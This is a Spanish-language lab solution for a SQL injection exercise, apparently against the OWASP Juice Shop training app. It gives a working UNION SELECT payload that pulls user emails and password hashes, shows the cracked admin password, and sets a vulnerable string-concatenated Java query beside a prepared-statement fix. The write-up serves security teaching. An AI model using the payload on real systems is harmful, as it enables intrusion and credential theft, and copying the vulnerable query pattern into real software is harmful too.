## Soluciones

### Payload funcional

```
apple'))+UNION+SELECT+1,2,3,4,email,password,7,8,9+FROM+Users--
```

### Ubicación de los datos en la respuesta

| Tipo de dato         | Campo       | Ejemplo                          |
| -------------------- | ----------- | -------------------------------- |
| Correos electrónicos | deluxePrice | admin@juice-sh.op                |
| Hashes de contraseña | image       | 0192023a7bbd73250516f069df18b500 |

### Resultado del cracking

**Contraseña del administrador:**

```
admin123
```

### Ejemplo de código vulnerable y seguro

**Código vulnerable:**

```java
String query = "SELECT * FROM Products WHERE q = '" + search + "'";
```

**Código seguro (consulta preparada):**

```java
String query = "SELECT * FROM Products WHERE q = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, search);
```

---

## Conclusión

Este ejercicio demuestra cómo una única vulnerabilidad de **Inyección SQL** puede comprometer completamente una aplicación. La prevención depende de aplicar **buenas prácticas de desarrollo seguro** desde el inicio del proyecto .

